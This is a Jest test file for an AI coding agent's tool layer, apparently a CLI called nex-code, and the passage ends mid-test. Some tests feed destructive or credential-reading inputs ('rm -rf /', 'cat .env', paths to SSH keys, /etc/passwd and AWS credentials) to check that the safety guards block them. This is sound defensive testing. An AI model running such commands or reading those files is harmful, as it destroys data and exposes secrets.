const fs = require("fs");
const path = require("path");
const os = require("os");

// Mock safety and diff modules
jest.mock("../cli/safety", () => ({
  isForbidden: jest.requireActual("../cli/safety").isForbidden,
  isSSHForbidden: jest.requireActual("../cli/safety").isSSHForbidden,
  isDangerous: jest.requireActual("../cli/safety").isDangerous,
  isCritical: jest.requireActual("../cli/safety").isCritical,
  isBashPathForbidden: jest.requireActual("../cli/safety").isBashPathForbidden,
  confirm: jest.fn().mockResolvedValue(true),
  getAutoConfirm: jest.fn().mockReturnValue(true),
  setAutoConfirm: jest.fn(),
}));

jest.mock("../cli/file-history", () => ({
  recordChange: jest.fn(),
}));

jest.mock("../cli/tool-tiers", () => ({
  ...jest.requireActual("../cli/tool-tiers"),
  getEditMode: jest.fn().mockReturnValue("fuzzy"),
}));

jest.mock("../cli/diff", () => ({
  showDiff: jest.fn(),
  showNewFile: jest.fn(),
  showEditDiff: jest.fn(),
  confirmFileChange: jest.fn().mockResolvedValue(true),
}));

const mockBrowserNavigate = jest.fn();
const mockBrowserScreenshot = jest.fn();
const mockBrowserClick = jest.fn();
const mockBrowserFill = jest.fn();
jest.mock("../cli/browser", () => ({
  browserNavigate: mockBrowserNavigate,
  browserScreenshot: mockBrowserScreenshot,
  browserClick: mockBrowserClick,
  browserFill: mockBrowserFill,
}));

const mockResolveProfile = jest.fn();
const mockSshExec = jest.fn();
const mockScpUpload = jest.fn();
const mockScpDownload = jest.fn();
jest.mock("../cli/ssh", () => ({
  ...jest.requireActual("../cli/ssh"),
  resolveProfile: mockResolveProfile,
  sshExec: mockSshExec,
  scpUpload: mockScpUpload,
  scpDownload: mockScpDownload,
}));

const mockResolveDeployConfig = jest.fn();
const mockLoadDeployConfigs = jest.fn();
jest.mock("../cli/deploy-config", () => ({
  resolveDeployConfig: mockResolveDeployConfig,
  loadDeployConfigs: mockLoadDeployConfigs,
}));

const {
  TOOL_DEFINITIONS,
  executeTool,
  resolvePath,
  getNodeBuiltinInstallAttempt,
} = require("../cli/tools");
const { confirmFileChange } = require("../cli/diff");
const { ToolProgress } = require("../cli/spinner");

describe("tools.js", () => {
  let tmpDir;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(process.cwd(), ".tmp-jc-tools-"));
    confirmFileChange.mockResolvedValue(true);
    // Default: resolveProfile throws (server not found), overridden in specific tests
    mockResolveProfile.mockReset();
    mockResolveProfile.mockImplementation((name) => {
      throw new Error(`Server "${name}" not found in servers.json`);
    });
    mockSshExec.mockReset();
    mockScpUpload.mockReset();
    mockScpDownload.mockReset();
    mockLoadDeployConfigs.mockReset();
    mockLoadDeployConfigs.mockReturnValue({});
    mockResolveDeployConfig.mockReset();
    mockResolveDeployConfig.mockImplementation((name) => {
      throw new Error(`Deploy config "${name}" not found`);
    });
  });

  describe("Node built-in install guard", () => {
    it("detects attempts to install runtime built-ins", () => {
      expect(getNodeBuiltinInstallAttempt("npm install fs path events")).toBe(
        "fs",
      );
      expect(getNodeBuiltinInstallAttempt("pnpm add node:crypto lodash")).toBe(
        "crypto",
      );
      expect(getNodeBuiltinInstallAttempt("npm install lodash")).toBe(null);
    });

    it("blocks npm install for built-in modules", async () => {
      const result = await executeTool("bash", { command: "npm install fs" });
      expect(result).toContain("BLOCKED");
      expect(result).toContain("Node.js built-in");
    });
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  // ─── TOOL_DEFINITIONS ─────────────────────────────────────
  describe("TOOL_DEFINITIONS", () => {
    it("defines expected number of tools", () => {
      expect(TOOL_DEFINITIONS.length).toBeGreaterThanOrEqual(17);
    });

    it("each tool has proper structure", () => {
      for (const tool of TOOL_DEFINITIONS) {
        expect(tool.type).toBe("function");
        expect(tool.function.name).toBeDefined();
        expect(tool.function.description).toBeDefined();
        expect(tool.function.parameters).toBeDefined();
        expect(tool.function.parameters.type).toBe("object");
      }
    });

    const expectedTools = [
      "bash",
      "read_file",
      "write_file",
      "edit_file",
      "list_directory",
      "search_files",
    ];
    it.each(expectedTools)("includes %s tool", (name) => {
      expect(TOOL_DEFINITIONS.some((t) => t.function.name === name)).toBe(true);
    });
  });

  // ─── resolvePath ──────────────────────────────────────────
  describe("resolvePath()", () => {
    it("blocks absolute paths outside the workspace", () => {
      expect(resolvePath("/tmp/test.js")).toBeNull();
    });

    it("resolves relative path from CWD", () => {
      const result = resolvePath("test.js");
      expect(path.isAbsolute(result)).toBe(true);
      expect(result).toContain("test.js");
    });

    it("blocks symlinks that escape the workspace", () => {
      const sandboxDir = fs.mkdtempSync(
        path.join(process.cwd(), ".tmp-resolve-path-"),
      );
      const outsideFile = path.join(os.tmpdir(), `outside-${Date.now()}.txt`);
      const symlinkPath = path.join(sandboxDir, "escape.txt");
      fs.writeFileSync(outsideFile, "secret");
      fs.symlinkSync(outsideFile, symlinkPath);

      expect(resolvePath(symlinkPath)).toBeNull();

      fs.rmSync(outsideFile, { force: true });
      fs.rmSync(sandboxDir, { recursive: true, force: true });
    });

    it("blocks sensitive paths", () => {
      expect(resolvePath("/home/user/.ssh/id_rsa")).toBeNull();
      expect(resolvePath("/etc/passwd")).toBeNull();
      expect(resolvePath("/home/user/.aws/credentials")).toBeNull();
      expect(resolvePath(".env")).toBeNull();
    });
  });

  // ─── bash tool ──────────────────────────────────────────────
  describe('executeTool("bash")', () => {
    it("executes command and returns output", async () => {
      const result = await executeTool("bash", { command: "echo hello" });
      expect(result.trim()).toBe("hello");
    });

    it("returns exit code on failure", async () => {
      const result = await executeTool("bash", { command: "exit 42" });
      expect(result).toContain("EXIT");
    });

    it("blocks forbidden commands", async () => {
      const result = await executeTool("bash", { command: "rm -rf / " });
      expect(result).toContain("BLOCKED");
    });

    it("blocks cat .env", async () => {
      const result = await executeTool("bash", { command: "cat .env" });
      expect(result).toContain("BLOCKED");
    });
  });

  // ─── read_file tool ─────────────────────────────────────────
  describe('executeTool("read_file")', () => {
    it("reads existing file", async () => {
      const fp = path.join(tmpDir, "test.txt");
      fs.writeFileSync(fp, "line1\nline2\nline3\n");
      const result = await executeTool("read_file", { path: fp });
      expect(result).toContain("1: line1");
      expect(result).toContain("2: line2");
      expect(result).toContain("3: line3");
    });

    it("reads with line range", async () => {
      const fp = path.join(tmpDir, "test.txt");
      fs.writeFileSync(fp, "line1\nline2\nline3\nline4\nline5\n");
      const result = await executeTool("read_file", {
        path: fp,
        line_start: 2,
        line_end: 4,
      });
      expect(result).toContain("2: line2");
      expect(result).toContain("4: line4");
      expect(result).not.toContain("1: line1");
      expect(result).not.toContain("5: line5");
    });

    it("returns error for missing file", async () => {
      const result = await executeTool("read_file", {
        path: path.join(tmpDir, "missing-read.txt"),
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("not found");
    });

    it("emits live progress updates while reading", async () => {
      const fp = path.join(tmpDir, "progress-read.txt");
      fs.writeFileSync(fp, "line1\nline2\nline3\nline4\n");
      const startSpy = jest.spyOn(ToolProgress.prototype, "start");
      const updateSpy = jest.spyOn(ToolProgress.prototype, "update");
      const stopSpy = jest.spyOn(ToolProgress.prototype, "stop");

      await executeTool("read_file", { path: fp, line_start: 2, line_end: 3 });

      expect(startSpy).toHaveBeenCalled();
      expect(updateSpy).toHaveBeenCalled();
      expect(stopSpy).toHaveBeenCalled();
    });
  });

  // ─── write_file tool ────────────────────────────────────────
  describe('executeTool("write_file")', () => {
    it("creates new file", async () => {
      const fp = path.join(tmpDir, "new.txt");
      const result = await executeTool("write_file", {
        path: fp,
        content: "hello world",
      });
      expect(result).toContain("Written");
      expect(fs.readFileSync(fp, "utf-8")).toBe("hello world");
    });

    it("creates nested directories", async () => {
      const fp = path.join(tmpDir, "sub", "dir", "new.txt");
      const result = await executeTool("write_file", {
        path: fp,
        content: "deep",
      });
      expect(result).toContain("Written");
      expect(fs.existsSync(fp)).toBe(true);
    });

    it("returns CANCELLED when user declines", async () => {
      const fp = path.join(tmpDir, "decline.txt");
      confirmFileChange.mockResolvedValueOnce(false);
      const result = await executeTool("write_file", {
        path: fp,
        content: "test",
      });
      expect(result).toContain("CANCELLED");
    });

    it("overwrites existing file after confirmation", async () => {
      const fp = path.join(tmpDir, "existing.txt");
      fs.writeFileSync(fp, "old");
      const result = await executeTool("write_file", {
        path: fp,
        content: "new",
      });
      expect(result).toContain("Written");
      expect(fs.readFileSync(fp, "utf-8")).toBe("new");
    });

    it("emits live progress updates while writing", async () => {
      const fp = path.join(tmpDir, "write-progress.txt");
      const startSpy = jest.spyOn(ToolProgress.prototype, "start");
      const updateSpy = jest.spyOn(ToolProgress.prototype, "update");
      const stopSpy = jest.spyOn(ToolProgress.prototype, "stop");

      await executeTool("write_file", {
        path: fp,
        content: "alpha\nbeta\ngamma\n",
      });

      expect(startSpy).toHaveBeenCalled();
      expect(updateSpy).toHaveBeenCalled();
      expect(stopSpy).toHaveBeenCalled();
    });
  });

  // ─── edit_file tool ─────────────────────────────────────────
  describe('executeTool("edit_file")', () => {
    it("replaces text in file", async () => {
      const fp = path.join(tmpDir, "edit.txt");
      fs.writeFileSync(fp, "hello world");
      const result = await executeTool("edit_file", {
        path: fp,
        old_text: "world",
        new_text: "nex",
      });
      expect(result).toContain("Edited");
      expect(fs.readFileSync(fp, "utf-8")).toBe("hello nex");
    });

    it("returns error when old_text not found", async () => {
      const fp = path.join(tmpDir, "edit.txt");
      fs.writeFileSync(fp, "hello world");
      const result = await executeTool("edit_file", {
        path: fp,
        old_text: "nonexistent",
        new_text: "replacement",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("not found");
    });

    it("returns error for missing file", async () => {
      const result = await executeTool("edit_file", {
        path: path.join(tmpDir, "missing-edit.txt"),
        old_text: "a",
        new_text: "b",
      });
      expect(result).toContain("ERROR");
    });

    it("returns CANCELLED when user declines", async () => {
      const fp = path.join(tmpDir, "edit.txt");
      fs.writeFileSync(fp, "hello world");
      confirmFileChange.mockResolvedValueOnce(false);
      const result = await executeTool("edit_file", {
        path: fp,
        old_text: "world",
        new_text: "nex",
      });
      expect(result).toContain("CANCELLED");
      // File unchanged
      expect(fs.readFileSync(fp, "utf-8")).toBe("hello world");
    });

    it("emits live progress updates while editing", async () => {
      const fp = path.join(tmpDir, "edit-progress.txt");
      fs.writeFileSync(fp, "hello world");
      const startSpy = jest.spyOn(ToolProgress.prototype, "start");
      const updateSpy = jest.spyOn(ToolProgress.prototype, "update");
      const stopSpy = jest.spyOn(ToolProgress.prototype, "stop");

      await executeTool("edit_file", {
        path: fp,
        old_text: "world",
        new_text: "terminal",
      });

      expect(startSpy).toHaveBeenCalled();
      expect(updateSpy).toHaveBeenCalled();
      expect(stopSpy).toHaveBeenCalled();
    });
  });

  // ─── list_directory tool ──────────────────────────────────
  describe('executeTool("list_directory")', () => {
    it("lists directory contents", async () => {
      fs.writeFileSync(path.join(tmpDir, "file1.js"), "");
      fs.writeFileSync(path.join(tmpDir, "file2.txt"), "");
      const result = await executeTool("list_directory", { path: tmpDir });
      expect(result).toContain("file1.js");
      expect(result).toContain("file2.txt");
    });

    it("shows directories with / suffix", async () => {
      fs.mkdirSync(path.join(tmpDir, "subdir"));
      const result = await executeTool("list_directory", { path: tmpDir });
      expect(result).toContain("subdir/");
    });

    it("skips hidden files", async () => {
      fs.writeFileSync(path.join(tmpDir, ".hidden"), "");
      fs.writeFileSync(path.join(tmpDir, "visible.js"), "");
      const result = await executeTool("list_directory", { path: tmpDir });
      expect(result).not.toContain(".hidden");
      expect(result).toContain("visible.js");
    });

    it("skips node_modules", async () => {
      fs.mkdirSync(path.join(tmpDir, "node_modules"));
      fs.writeFileSync(path.join(tmpDir, "index.js"), "");
      const result = await executeTool("list_directory", { path: tmpDir });
      expect(result).not.toContain("node_modules");
    });

    it("returns error for missing directory", async () => {
      const result = await executeTool("list_directory", {
        path: path.join(tmpDir, "missing-dir"),
      });
      expect(result).toContain("ERROR");
    });

    it("filters by pattern", async () => {
      fs.writeFileSync(path.join(tmpDir, "app.js"), "");
      fs.writeFileSync(path.join(tmpDir, "style.css"), "");
      const result = await executeTool("list_directory", {
        path: tmpDir,
        pattern: "*.js",
      });
      expect(result).toContain("app.js");
      expect(result).not.toContain("style.css");
    });

    it("returns (empty) for empty directory", async () => {
      const emptyDir = path.join(tmpDir, "empty");
      fs.mkdirSync(emptyDir);
      const result = await executeTool("list_directory", { path: emptyDir });
      expect(result).toBe("(empty)");
    });
  });

  // ─── search_files tool ──────────────────────────────────────
  describe('executeTool("search_files")', () => {
    it("finds pattern in files", async () => {
      fs.writeFileSync(
        path.join(tmpDir, "search.js"),
        'const hello = "world";\n',
      );
      const result = await executeTool("search_files", {
        path: tmpDir,
        pattern: "hello",
      });
      expect(result).toContain("hello");
    });

    it("returns no matches when not found", async () => {
      fs.writeFileSync(path.join(tmpDir, "search.js"), "const x = 1;\n");
      const result = await executeTool("search_files", {
        path: tmpDir,
        pattern: "nonexistent_pattern_xyz",
      });
      expect(result).toContain("no matches");
    });

    it("passes file_pattern as --include", async () => {
      fs.writeFileSync(path.join(tmpDir, "app.js"), "const hello = 1;\n");
      fs.writeFileSync(path.join(tmpDir, "app.css"), "hello { color: red; }\n");
      const result = await executeTool("search_files", {
        path: tmpDir,
        pattern: "hello",
        file_pattern: "*.js",
      });
      expect(result).toContain("hello");
      expect(result).toContain(".js");
    });
  });

  // ─── glob tool ──────────────────────────────────────────────
  describe('executeTool("glob")', () => {
    it("finds files matching glob pattern", async () => {
      fs.writeFileSync(path.join(tmpDir, "app.js"), "");
      fs.writeFileSync(path.join(tmpDir, "style.css"), "");
      const result = await executeTool("glob", {
        pattern: "*.js",
        path: tmpDir,
      });
      expect(result).toContain("app.js");
      expect(result).not.toContain("style.css");
    });

    it("finds files recursively with **", async () => {
      const sub = path.join(tmpDir, "src");
      fs.mkdirSync(sub);
      fs.writeFileSync(path.join(sub, "index.js"), "");
      fs.writeFileSync(path.join(tmpDir, "root.js"), "");
      const result = await executeTool("glob", {
        pattern: "**/*.js",
        path: tmpDir,
      });
      expect(result).toContain("index.js");
      expect(result).toContain("root.js");
    });

    it("returns no matches for unmatched pattern", async () => {
      fs.writeFileSync(path.join(tmpDir, "file.txt"), "");
      const result = await executeTool("glob", {
        pattern: "*.py",
        path: tmpDir,
      });
      expect(result).toBe("(no matches)");
    });

    it("uses CWD when no path specified", async () => {
      const result = await executeTool("glob", { pattern: "package.json" });
      expect(result).toContain("package.json");
    });

    it("skips node_modules and .git", async () => {
      fs.mkdirSync(path.join(tmpDir, "node_modules"));
      fs.writeFileSync(path.join(tmpDir, "node_modules", "dep.js"), "");
      fs.mkdirSync(path.join(tmpDir, ".git"));
      fs.writeFileSync(path.join(tmpDir, ".git", "HEAD"), "");
      fs.writeFileSync(path.join(tmpDir, "app.js"), "");
      const result = await executeTool("glob", {
        pattern: "**/*.js",
        path: tmpDir,
      });
      expect(result).toContain("app.js");
      expect(result).not.toContain("node_modules");
      expect(result).not.toContain(".git");
    });

    it("prioritizes stronger path matches over newer files", async () => {
      const exact = path.join(tmpDir, "agent.js");
      const noisyDir = path.join(tmpDir, "nested");
      const noisy = path.join(noisyDir, "agent-helper.js");
      fs.mkdirSync(noisyDir);
      fs.writeFileSync(exact, "");
      fs.writeFileSync(noisy, "");
      const oldTime = new Date(2020, 0, 1);
      fs.utimesSync(exact, oldTime, oldTime);

      const result = await executeTool("glob", {
        pattern: "agent.js",
        path: tmpDir,
      });
      const lines = result.split("\n");
      expect(lines[0]).toContain("agent.js");
    });
  });

  // ─── grep tool ──────────────────────────────────────────────
  describe('executeTool("grep")', () => {
    it("finds pattern in files", async () => {
      fs.writeFileSync(path.join(tmpDir, "code.js"), 'const foo = "bar";\n');
      const result = await executeTool("grep", {
        pattern: "foo",
        path: tmpDir,
      });
      expect(result).toContain("foo");
    });

    it("supports case-insensitive search", async () => {
      fs.writeFileSync(path.join(tmpDir, "code.js"), "const FOO = 1;\n");
      const result = await executeTool("grep", {
        pattern: "foo",
        path: tmpDir,
        ignore_case: true,
      });
      expect(result).toContain("FOO");
    });

    it("filters by include pattern", async () => {
      fs.writeFileSync(path.join(tmpDir, "code.js"), "hello\n");
      fs.writeFileSync(path.join(tmpDir, "code.py"), "hello\n");
      const result = await executeTool("grep", {
        pattern: "hello",
        path: tmpDir,
        include: "*.js",
      });
      expect(result).toContain(".js");
    });

    it("returns no matches for unmatched pattern", async () => {
      fs.writeFileSync(path.join(tmpDir, "code.js"), "const x = 1;\n");
      const result = await executeTool("grep", {
        pattern: "nonexistent_xyz_abc",
        path: tmpDir,
      });
      expect(result).toBe("(no matches)");
    });

    it("uses CWD when no path specified", async () => {
      // Create a searchable file in tmpDir so we don't depend on real CWD
      const fp = path.join(tmpDir, "searchable.txt");
      fs.writeFileSync(fp, "hello nex-code world\n");
      const result = await executeTool("grep", {
        pattern: "nex-code",
        path: tmpDir,
      });
      expect(result).toContain("nex-code");
    });

    it("prioritizes definition-like matches over incidental string matches", async () => {
      fs.writeFileSync(
        path.join(tmpDir, "defs.js"),
        "function runApp() {\n  return true;\n}\n",
      );
      fs.writeFileSync(
        path.join(tmpDir, "notes.js"),
        'const msg = "runApp should maybe exist";\n',
      );

      const result = await executeTool("grep", {
        pattern: "runApp",
        path: tmpDir,
      });
      const lines = result.split("\n");
      expect(lines[0]).toContain("defs.js");
    });
  });

  // ─── patch_file tool ───────────────────────────────────────
  describe('executeTool("patch_file")', () => {
    it("applies multiple patches", async () => {
      const fp = path.join(tmpDir, "patch.txt");
      fs.writeFileSync(fp, "hello world\nfoo bar\n");
      const result = await executeTool("patch_file", {
        path: fp,
        patches: [
          { old_text: "hello", new_text: "hi" },
          { old_text: "foo", new_text: "baz" },
        ],
      });
      expect(result).toContain("Patched");
      expect(result).toContain("2 replacements");
      const content = fs.readFileSync(fp, "utf-8");
      expect(content).toContain("hi world");
      expect(content).toContain("baz bar");
    });

    it("returns error for missing file", async () => {
      const result = await executeTool("patch_file", {
        path: path.join(tmpDir, "missing-patch.txt"),
        patches: [{ old_text: "a", new_text: "b" }],
      });
      expect(result).toContain("ERROR");
    });

    it("returns error for empty patches", async () => {
      const fp = path.join(tmpDir, "patch.txt");
      fs.writeFileSync(fp, "hello");
      const result = await executeTool("patch_file", { path: fp, patches: [] });
      expect(result).toContain("ERROR");
      expect(result).toContain("No patches");
    });

    it("returns error when old_text not found", async () => {
      const fp = path.join(tmpDir, "patch.txt");
      fs.writeFileSync(fp, "hello world");
      const result = await executeTool("patch_file", {
        path: fp,
        patches: [{ old_text: "nonexistent", new_text: "replacement" }],
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("not found");
    });

    it("returns CANCELLED when user declines", async () => {
      const fp = path.join(tmpDir, "patch.txt");
      fs.writeFileSync(fp, "hello world");
      confirmFileChange.mockResolvedValueOnce(false);
      const result = await executeTool("patch_file", {
        path: fp,
        patches: [{ old_text: "hello", new_text: "hi" }],
      });
      expect(result).toContain("CANCELLED");
      expect(fs.readFileSync(fp, "utf-8")).toBe("hello world");
    });

    it("emits live progress updates while patching", async () => {
      const fp = path.join(tmpDir, "patch-progress.txt");
      fs.writeFileSync(fp, "a\nb\nc\n");
      const startSpy = jest.spyOn(ToolProgress.prototype, "start");
      const updateSpy = jest.spyOn(ToolProgress.prototype, "update");
      const stopSpy = jest.spyOn(ToolProgress.prototype, "stop");

      await executeTool("patch_file", {
        path: fp,
        patches: [{ old_text: "b", new_text: "beta" }],
      });

      expect(startSpy).toHaveBeenCalled();
      expect(updateSpy).toHaveBeenCalled();
      expect(stopSpy).toHaveBeenCalled();
    });
  });

  // ─── web_fetch tool ────────────────────────────────────────
  describe('executeTool("web_fetch")', () => {
    const axios = require("axios");

    it("fetches URL and strips HTML", async () => {
      jest.spyOn(axios, "get").mockResolvedValueOnce({
        data: "<html><body><p>Hello World</p></body></html>",
      });
      const result = await executeTool("web_fetch", {
        url: "https://example.com",
      });
      expect(result).toContain("Hello World");
      expect(result).not.toContain("<p>");
      axios.get.mockRestore();
    });

    it("handles JSON response", async () => {
      jest.spyOn(axios, "get").mockResolvedValueOnce({
        data: { key: "value" },
      });
      const result = await executeTool("web_fetch", {
        url: "https://api.example.com/data",
      });
      expect(result).toContain("key");
      expect(result).toContain("value");
      axios.get.mockRestore();
    });

    it("respects max_length", async () => {
      jest.spyOn(axios, "get").mockResolvedValueOnce({
        data: "a".repeat(20000),
      });
      const result = await executeTool("web_fetch", {
        url: "https://example.com",
        max_length: 100,
      });
      expect(result.length).toBeLessThanOrEqual(100);
      axios.get.mockRestore();
    });

    it("returns error on fetch failure", async () => {
      jest
        .spyOn(axios, "get")
        .mockRejectedValueOnce(new Error("Network error"));
      const result = await executeTool("web_fetch", {
        url: "https://fail.example.com",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Network error");
      axios.get.mockRestore();
    });

    it("strips script and style tags", async () => {
      jest.spyOn(axios, "get").mockResolvedValueOnce({
        data: '<html><script>alert("xss")</script><style>.a{}</style><p>Content</p></html>',
      });
      const result = await executeTool("web_fetch", {
        url: "https://example.com",
      });
      expect(result).toContain("Content");
      expect(result).not.toContain("alert");
      expect(result).not.toContain(".a{}");
      axios.get.mockRestore();
    });

    it("returns (empty response) for empty data", async () => {
      jest.spyOn(axios, "get").mockResolvedValueOnce({ data: "" });
      const result = await executeTool("web_fetch", {
        url: "https://example.com",
      });
      expect(result).toBe("(empty response)");
      axios.get.mockRestore();
    });
  });

  // ─── web_search tool ──────────────────────────────────────
  describe('executeTool("web_search")', () => {
    const axios = require("axios");

    it("parses DuckDuckGo HTML results", async () => {
      const mockHtml = `
        <a class="result__a" href="/l/?uddg=https%3A%2F%2Fexample.com%2Fpage&rut=abc">
          Example Page Title
        </a>
        <a class="result__a" href="/l/?uddg=https%3A%2F%2Fother.com&rut=def">
          Other Result
        </a>
      `;
      jest.spyOn(axios, "get").mockResolvedValueOnce({ data: mockHtml });
      const result = await executeTool("web_search", { query: "test query" });
      expect(result).toContain("Example Page Title");
      expect(result).toContain("example.com");
      axios.get.mockRestore();
    });

    it("returns (no results) when no matches", async () => {
      jest
        .spyOn(axios, "get")
        .mockResolvedValueOnce({ data: "<html><body></body></html>" });
      const result = await executeTool("web_search", { query: "test" });
      expect(result).toBe("(no results)");
      axios.get.mockRestore();
    });

    it("returns error on search failure", async () => {
      jest.spyOn(axios, "get").mockRejectedValueOnce(new Error("timeout"));
      const result = await executeTool("web_search", { query: "test" });
      expect(result).toContain("ERROR");
      axios.get.mockRestore();
    });

    it("respects max_results", async () => {
      const mockHtml = Array.from(
        { length: 10 },
        (_, i) =>
          `<a class="result__a" href="/l/?uddg=https%3A%2F%2Fexample${i}.com&rut=x">Result ${i}</a>`,
      ).join("\n");
      jest.spyOn(axios, "get").mockResolvedValueOnce({ data: mockHtml });
      const result = await executeTool("web_search", {
        query: "test",
        max_results: 2,
      });
      const lines = result.split("\n\n");
      expect(lines.length).toBeLessThanOrEqual(2);
      axios.get.mockRestore();
    });
  });

  // ─── ask_user tool ─────────────────────────────────────────
  describe('executeTool("ask_user")', () => {
    it("prompts user and returns response", async () => {
      const rl = require("readline");
      const mockRl = {
        question: jest.fn((q, cb) => cb("yes")),
        close: jest.fn(),
      };
      jest.spyOn(rl, "createInterface").mockReturnValueOnce(mockRl);
      const result = await executeTool("ask_user", { question: "Continue?" });
      expect(result).toBe("yes");
      rl.createInterface.mockRestore();
    });

    it("returns (no response) for empty input", async () => {
      const rl = require("readline");
      const mockRl = {
        question: jest.fn((q, cb) => cb("")),
        close: jest.fn(),
      };
      jest.spyOn(rl, "createInterface").mockReturnValueOnce(mockRl);
      const result = await executeTool("ask_user", { question: "Continue?" });
      expect(result).toBe("(no response)");
      rl.createInterface.mockRestore();
    });
  });

  // ─── bash dangerous command ────────────────────────────────
  describe('executeTool("bash") dangerous commands', () => {
    it("allows dangerous command when confirm returns true", async () => {
      const result = await executeTool("bash", {
        command: "echo dangerous && exit 1",
      });
      // confirm is mocked to return true, so it should execute
      // The command will likely fail with exit code but won't be BLOCKED
      expect(result).not.toContain("BLOCKED");
    });

    it("returns CANCELLED when confirm returns false for dangerous command", async () => {
      const { confirm } = require("../cli/safety");
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool("bash", {
        command: "git push origin main",
      });
      expect(result).toContain("CANCELLED");
    });

    it("returns (no output) for empty stdout", async () => {
      const result = await executeTool("bash", { command: "true" });
      expect(result).toBe("(no output)");
    });
  });

  // ─── read_file binary detection ──────────────────────────────
  describe('executeTool("read_file") binary detection', () => {
    it("detects binary files via null bytes", async () => {
      const fp = path.join(tmpDir, "binary.dat");
      const buf = Buffer.alloc(100);
      buf[50] = 0; // null byte
      buf.write("text", 0);
      fs.writeFileSync(fp, buf);
      const result = await executeTool("read_file", { path: fp });
      expect(result).toContain("binary file");
    });
  });

  // ─── git tools ──────────────────────────────────────────────
  describe("git tools", () => {
    describe('executeTool("git_status")', () => {
      it("includes git_status in tool definitions", () => {
        expect(
          TOOL_DEFINITIONS.some((t) => t.function.name === "git_status"),
        ).toBe(true);
      });

      it("returns branch and status info", async () => {
        const result = await executeTool("git_status", {});
        expect(result).toContain("Branch:");
      });
    });

    describe('executeTool("git_diff")', () => {
      it("includes git_diff in tool definitions", () => {
        expect(
          TOOL_DEFINITIONS.some((t) => t.function.name === "git_diff"),
        ).toBe(true);
      });

      it("returns diff or no diff", async () => {
        const result = await executeTool("git_diff", {});
        expect(typeof result).toBe("string");
      });

      it("returns diff for specific file", async () => {
        const result = await executeTool("git_diff", {
          file: "nonexistent-file-xyz.js",
        });
        expect(result).toBe("(no diff)");
      });

      it("supports staged flag", async () => {
        const result = await executeTool("git_diff", { staged: true });
        expect(typeof result).toBe("string");
      });
    });

    describe('executeTool("git_log")', () => {
      it("includes git_log in tool definitions", () => {
        expect(
          TOOL_DEFINITIONS.some((t) => t.function.name === "git_log"),
        ).toBe(true);
      });

      it("returns recent commits", async () => {
        const result = await executeTool("git_log", {});
        expect(result.length).toBeGreaterThan(0);
      });

      it("respects count parameter", async () => {
        const result = await executeTool("git_log", { count: 3 });
        const lines = result.split("\n").filter(Boolean);
        expect(lines.length).toBeLessThanOrEqual(3);
      });

      it("caps count at 50", async () => {
        const result = await executeTool("git_log", { count: 100 });
        const lines = result.split("\n").filter(Boolean);
        expect(lines.length).toBeLessThanOrEqual(50);
      });

      it("supports file parameter", async () => {
        const result = await executeTool("git_log", { file: "package.json" });
        expect(result.length).toBeGreaterThan(0);
      });
    });
  });

  // ─── web_search URL decoding fallback ─────────────────────
  describe("web_search URL decoding fallback", () => {
    const axios = require("axios");

    it("handles malformed URL encoding gracefully", async () => {
      // %ZZ is invalid percent-encoding that causes decodeURIComponent to throw
      const mockHtml = `
        <a class="result__a" href="/l/?uddg=https%3A%2F%2Fexample.com%2Fpage%ZZ&rut=abc">
          Valid Title
        </a>
      `;
      jest.spyOn(axios, "get").mockResolvedValueOnce({ data: mockHtml });
      const result = await executeTool("web_search", { query: "test" });
      // Should not throw, should return a result
      expect(result).toContain("Valid Title");
      axios.get.mockRestore();
    });
  });

  // ─── glob truncation ──────────────────────────────────────
  describe("glob truncation warning", () => {
    it("shows truncation warning at 200 results", async () => {
      // Create 210 files
      for (let i = 0; i < 210; i++) {
        fs.writeFileSync(
          path.join(tmpDir, `file${String(i).padStart(3, "0")}.txt`),
          "",
        );
      }
      const result = await executeTool("glob", {
        pattern: "*.txt",
        path: tmpDir,
      });
      expect(result).toContain("truncated");
      expect(result).toContain("200");
    });
  });

  // ─── recordChange calls for file operations ────────────────
  describe("recordChange integration", () => {
    it("records change after write_file (new file)", async () => {
      const { recordChange } = require("../cli/file-history");
      recordChange.mockClear();
      const fp = path.join(tmpDir, "recorded-new.txt");
      await executeTool("write_file", { path: fp, content: "hello" });
      expect(recordChange).toHaveBeenCalledWith(
        "write_file",
        fp,
        null,
        "hello",
      );
    });

    it("records change after write_file (overwrite)", async () => {
      const { recordChange } = require("../cli/file-history");
      recordChange.mockClear();
      const fp = path.join(tmpDir, "recorded-ow.txt");
      fs.writeFileSync(fp, "old");
      await executeTool("write_file", { path: fp, content: "new" });
      expect(recordChange).toHaveBeenCalledWith("write_file", fp, "old", "new");
    });

    it("records change after edit_file", async () => {
      const { recordChange } = require("../cli/file-history");
      recordChange.mockClear();
      const fp = path.join(tmpDir, "recorded-edit.txt");
      fs.writeFileSync(fp, "hello world");
      await executeTool("edit_file", {
        path: fp,
        old_text: "world",
        new_text: "nex",
      });
      expect(recordChange).toHaveBeenCalledWith(
        "edit_file",
        fp,
        "hello world",
        "hello nex",
      );
    });

    it("records change after patch_file", async () => {
      const { recordChange } = require("../cli/file-history");
      recordChange.mockClear();
      const fp = path.join(tmpDir, "recorded-patch.txt");
      fs.writeFileSync(fp, "hello world");
      await executeTool("patch_file", {
        path: fp,
        patches: [{ old_text: "hello", new_text: "hi" }],
      });
      expect(recordChange).toHaveBeenCalledWith(
        "patch_file",
        fp,
        "hello world",
        "hi world",
      );
    });
  });

  // ─── spinner wrapper for non-interactive tools ─────────────
  describe("spinner wrapper", () => {
    let origIsTTY;
    beforeEach(() => {
      origIsTTY = process.stderr.isTTY;
      process.stderr.isTTY = true;
    });
    afterEach(() => {
      process.stderr.isTTY = origIsTTY;
    });

    it("shows spinner for read_file", async () => {
      const fp = path.join(tmpDir, "spinner-test.txt");
      fs.writeFileSync(fp, "hello");
      const writeSpy = jest
        .spyOn(process.stderr, "write")
        .mockImplementation(() => {});
      await executeTool("read_file", { path: fp });
      const output = writeSpy.mock.calls.map((c) => c[0]).join("");
      expect(output).toContain("Reading");
      writeSpy.mockRestore();
    });

    it("shows spinner for grep", async () => {
      fs.writeFileSync(path.join(tmpDir, "g.js"), "const x = 1;\n");
      const writeSpy = jest
        .spyOn(process.stderr, "write")
        .mockImplementation(() => {});
